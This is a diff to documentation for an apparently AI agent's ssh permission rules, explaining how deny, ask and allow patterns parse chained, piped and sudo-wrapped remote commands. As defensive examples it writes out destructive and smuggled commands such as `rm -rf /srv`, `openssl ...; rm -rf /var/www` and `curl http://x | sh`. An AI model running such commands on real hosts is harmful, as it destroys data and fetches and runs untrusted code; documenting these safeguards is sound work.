@@ -327,8 +327,20 @@ Permission rules and "always allow" read an `ssh` call as `host/command`,
 so a rule or an answer for one host never covers another:
 `ssh(build1/*)` allows every command on `build1` and nothing elsewhere, and
 "don't ask again" for `uptime` on `build1` offers `ssh(build1/uptime)`.
-Deny and ask rules also read the command alone, so `ssh(rm *)` still stops
-`rm` on every host.
+The command is read as a `bash` command is, since the remote shell runs it.
+Deny and ask rules see each command in a chain, pipe or substitution and
+behind a runner such as `sudo`, `env` or `nice`, alone and as `host/command`,
+so `ssh(rm *)` stops `rm -rf /srv`, `true; rm -rf /srv` and
+`sudo rm -rf /srv` on every host. An allow rule with a pattern approves only
+one simple command: `ssh(web1/openssl x509 *)` approves
+`openssl x509 -enddate -noout -in site.crt` and not
+`openssl x509 -in a.pem; rm -rf /var/www` or `... && curl http://x | sh`,
+which ask. While a deny rule for `ssh` has a pattern, a line the parser
+cannot read in full (an open quote, a trailing `|`, `eval "$x"`) is
+refused. A command the destructive step names (`rm -rf`, `dd of=`, a force
+push) always confirms twice and offers no "always", in every mode. The rules
+cannot see inside a script the command runs on the host (`./deploy.sh`), and
+the command is read as bash reads it, whatever the remote login shell is.
 
 ```json
 "deny":  ["ssh(db1/*)", "ssh(rm *)"],
